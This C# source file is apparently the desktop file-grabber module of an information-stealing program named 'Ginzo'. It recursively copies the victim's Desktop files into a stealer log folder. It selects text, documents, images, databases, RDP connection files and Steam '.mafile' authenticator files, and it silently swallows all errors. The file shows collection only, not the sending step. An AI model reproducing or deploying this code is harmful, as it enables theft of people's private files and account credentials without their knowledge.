using System;
using System.Collections.Generic;
using System.IO;

namespace Ginzo
{
    public partial class Files
    {
        public static int FilesCount = 0;
        public static void GetFiles(string LogPath)
        {
            try
            {
                string Files = LogPath + "\\Desktop Files";
                Directory.CreateDirectory(Files);
                if (!Directory.Exists(Files))
                {
                    GetFiles(Files);
                }
                else
                {
                    CopyDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Files, "*.*", 1000000); 
                }
            }
            catch { }
        }
        private static long GetDirSize(string path, long size = 0)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(path))
                {
                    try
                    {
                        size += new FileInfo(file).Length;
                        
                    }
                    catch  { }
                }
                foreach (string dir in Directory.EnumerateDirectories(path))
                {
                    try
                    {
                        size += GetDirSize(dir);
                    }
                    catch  { }
                }
            }
            catch  { }
            return size;
        }

        public static void CopyDirectory(string source, string target, string pattern, long maxSize)
        {
            var stack = new Stack<GetFiles.Folders>();
            stack.Push(new GetFiles.Folders(source, target));
            long size = GetDirSize(target);
            string[] expansion = new string[] { ".txt", ".doc", ".mafile", ".rdp", ".jpg", ".png", ".db" };
            while (stack.Count > 0)

            {
                GetFiles.Folders folders = stack.Pop();
                try
                {
                    Directory.CreateDirectory(folders.Target);
                    foreach (string file in Directory.EnumerateFiles(folders.Source, pattern))
                    {
                        try
                        {
                            if (Array.IndexOf(expansion, Path.GetExtension(file).ToLower()) < 0)
                            {
                                continue;
                            }
                            string targetPath = Path.Combine(folders.Target, Path.GetFileName(file));
                            if (new FileInfo(file).Length / 0x400 < 0x1388) // 1024 < 5000
                            {
                                File.Copy(file, targetPath);
                                size += new FileInfo(targetPath).Length;
                                if (size > maxSize)
                                {
                                    return;
                                }
                                FilesCount++;
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (PathTooLongException) { continue; }
                try
                {
                    foreach (string folder in Directory.EnumerateDirectories(folders.Source))
                    {
                        try
                        {
                            if (!folder.Contains(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.UserName)))
                            {
                                stack.Push(new GetFiles.Folders(folder, Path.Combine(folders.Target, Path.GetFileName(folder))));
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (DirectoryNotFoundException) { continue; }
                catch  (PathTooLongException) { continue; }
            }
            stack.Clear();
        }
    }
}
